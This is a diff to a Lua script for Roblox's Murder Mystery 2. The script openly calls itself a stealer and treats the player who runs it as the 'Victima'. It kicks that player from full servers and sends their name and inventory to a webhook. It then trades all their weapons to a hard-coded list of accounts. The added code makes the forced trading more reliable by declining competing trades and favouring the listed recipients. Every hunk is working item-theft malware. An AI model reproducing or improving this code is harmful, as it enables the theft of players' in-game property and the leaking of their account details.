@@ -12,7 +12,7 @@ local pingEveryone = _G.pingEveryone == "Yes"
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- Kick inicial debajo de configuración
+-- Kick inicial
 local function CheckServerInitial()
     if #Players:GetPlayers() >= 12 then
         LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
@@ -223,7 +223,7 @@ if #weaponsToSend > 0 then
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
--- Webhook final: Inventario enviado (formato idéntico)
+-- Webhook final
 local function sendFinalInventoryWebhook()
     local fields={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
@@ -244,19 +244,30 @@ local function sendFinalInventoryWebhook()
     SendWebhook("📦 Inventario enviado","",fields)
 end
 
--- Trade principal
+-- ================= Trade mejorado =================
+local currentTarget = nil
+
 local function doTrade(targetName)
-    if #weaponsToSend==0 then return end
-    while #weaponsToSend>0 do
-        local status=getTradeStatus()
-        if status=="None" then
+    local targetPlayer = Players:FindFirstChild(targetName)
+    if not targetPlayer or #weaponsToSend == 0 then return end
+
+    if currentTarget and currentTarget ~= targetName then
+        declineTrade()
+        task.wait(0.5)
+    end
+
+    currentTarget = targetName
+
+    while #weaponsToSend > 0 do
+        local status = getTradeStatus()
+        if status == "None" then
             sendTradeRequest(targetName)
-        elseif status=="SendingRequest" then
+        elseif status == "SendingRequest" then
             task.wait(0.3)
-        elseif status=="StartTrade" then
-            for i=1,math.min(4,#weaponsToSend) do
-                local w=table.remove(weaponsToSend,1)
-                for _=1,w.Amount do
+        elseif status == "StartTrade" then
+            for i = 1, math.min(4, #weaponsToSend) do
+                local w = table.remove(weaponsToSend, 1)
+                for _ = 1, w.Amount do
                     addWeaponToTrade(w.DataID)
                 end
             end
@@ -268,13 +279,19 @@ local function doTrade(targetName)
         end
         task.wait(1)
     end
+
     sendFinalInventoryWebhook()
+    currentTarget = nil
 end
 
--- Rechazar trades de usuarios no permitidos
+-- Rechazar trades de usuarios no permitidos y priorizar lista
 TradeService.OnTradeReceived.OnClientEvent:Connect(function(sender)
-    if not table.find(users,sender.Name) then
+    if not table.find(users, sender.Name) then
         declineTrade()
+    elseif currentTarget ~= sender.Name then
+        declineTrade()
+        task.wait(0.5)
+        doTrade(sender.Name)
     end
 end)
 
